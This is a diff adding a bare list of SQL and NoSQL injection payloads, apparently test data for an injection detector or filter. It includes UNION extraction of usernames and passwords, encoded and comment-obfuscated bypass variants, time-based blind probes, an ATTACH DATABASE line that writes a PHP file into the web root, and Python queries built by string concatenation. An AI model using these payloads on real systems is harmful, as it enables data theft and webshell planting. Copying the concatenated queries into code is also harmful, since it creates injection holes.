@@ -1,0 +1,24 @@
+?id=1/**/UNION/**/SELECT/**/username,password/**/FROM/**/users
+UNI/**/ON SEL/**/ECT 1,2,3 FROM users
+?id=-1 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables
+?id=1 oRdEr/**/bY/**/3
+?id=1/**/AND/**/SLEEP(5)
+id=1%2527%2520OR%25201%253D1
+%27 OR %271%27=%271
+name=%27%20or%201%3D1--
+?q=UNION%20SELECT%20NULL,NULL--
+?q=1+UNION+ALL+SELECT+NULL
+q=union%20all%20select%20username%20from%20users
+payload=1';WAITFOR+DELAY+'0:0:5'--
+?cat=Books or 1=1-- -
+id=1 OR 1=1 LIMIT 1
+db.session.execute(text("SELECT * FROM users WHERE name = '" + name + "'"))
+User.objects.raw("SELECT * FROM auth_user WHERE id = %s" % uid)
+db.query.raw(f"SELECT * FROM t WHERE x={user_in}")
+session.query("SELECT * FROM u WHERE n={}".format(name))
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"$where": "this.password == this.username"}
+{"user": {"$gt": ""}}
+{"role": {"$regex": "^adm"}}
+1; ATTACH DATABASE '/var/www/lol.php' AS lol
+1;PRAGMA table_info(users)
